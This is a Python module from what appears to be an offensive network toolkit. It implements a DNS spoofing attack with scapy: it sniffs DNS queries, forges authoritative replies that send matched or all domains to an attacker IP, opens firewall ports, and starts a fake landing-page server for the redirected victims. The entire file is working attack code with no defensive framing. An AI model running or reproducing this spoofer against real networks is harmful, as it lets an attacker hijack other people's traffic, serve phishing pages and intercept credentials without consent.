# ============================================================
#  File: vanta/attacks/shade.py
# ============================================================
import threading
import time
from scapy.all import (  # type: ignore
    ARP, Ether, DNS, DNSQR, DNSRR, IP, UDP,
    sniff, send, get_if_hwaddr,
)

from .base import Attack
from ..core.iface import require_root
from ..core.errors import AttackError


class DnsSpoofer(Attack):
    """
    Sniffs DNS queries on the interface and forges responses for any
    domain matching cfg.dns_rules. Rules format:
        {"example.com": "10.66.0.66", "*": "10.66.0.66"}
    Wildcard "*" catches everything not explicitly mapped.
    """

    NAME = "dns-spoof"

    def _run(self):
        raise NotImplementedError  # we override start() below

    def setup(self):
        require_root()
        self.cfg.require_interface()
        if not self.cfg.attacker_ip:
            raise AttackError("attacker IP not set — need a bind address.")

        # --- auto-open the firewall for inbound DNS + (optionally) HTTP ---
        from ..core import Firewall
        self._fw = Firewall(self.log)
        self._fw.open_udp(53)
        if self.cfg.auto_serve:
            self._fw.open_tcp(self.cfg.serve_port)

        # --- auto-serve landing page ---
        self._server = None
        if self.cfg.auto_serve:
            from ..serve import FakeServer
            self._server = FakeServer(
                logger=self.log,
                port=self.cfg.serve_port,
                bind=self.cfg.serve_bind,
                root=self.cfg.serve_root or None,
                page_html=self.cfg.serve_page or None,
            )
            if not self._server.start():
                self.log.warn("dns-spoof: server failed to start; "
                              "DNS replies will still be sent")
                self._server = None

    def teardown(self):
        if getattr(self, "_server", None):
            self._server.stop()
        if getattr(self, "_fw", None):
            self._fw.close_all()

    # ------- override start to use scapy's blocking sniff --------
    def start(self) -> bool:
        if self.is_running():
            self.log.warn("dns-spoof already running.")
            return False
        try:
            self.setup()
        except Exception as e:
            self.log.err(f"setup failed: {e}")
            return False

        self._stop.clear()
        self.state = self.state.RUNNING if hasattr(self.state, "RUNNING") \
            else self.state  # pragma
        from .base import AttackState
        self.state = AttackState.RUNNING
        self.started_at = time.time()

        def loop():
            try:
                sniff(
                    iface=self.cfg.iface,
                    filter="udp port 53",
                    prn=self._handle,
                    store=False,
                    stop_filter=lambda p: self._stop.is_set(),
                )
            except Exception as e:
                self.log.err(f"sniff error: {e}")

        self._thread = threading.Thread(target=loop, daemon=True,
                                        name="vanta-dns")
        self._thread.start()
        self.log.attack("▶ dns-spoof started")
        return True

    def _handle(self, pkt):
        try:
            if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
                return
            if pkt[DNS].qr != 0:
                return  # response

            qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            qtype = pkt[DNSQR].qtype
            if qtype not in (1, 28):  # A, AAAA
                return

            spoof_ip = self._match(qname)
            if not spoof_ip:
                return

            self.log.snare(f"DNS: {qname} → {spoof_ip}")
            self.stats["spoofed"] = self.stats.get("spoofed", 0) + 1
            self.stats["last_domain"] = qname
            self.stats["last_reply"] = spoof_ip

            resp = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=53, dport=pkt[UDP].sport) /
                DNS(
                    id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
                             ttl=60, rdata=spoof_ip),
                )
            )
            send(resp, iface=self.cfg.iface, verbose=False)
        except Exception as e:
            self.log.warn(f"dns handler error: {e}")

    def _match(self, qname: str):
        rules = self.cfg.dns_rules or {}
        for domain, ip in rules.items():
            if domain == "*":
                continue
            if qname == domain or qname.endswith("." + domain):
                return ip
        return rules.get("*")
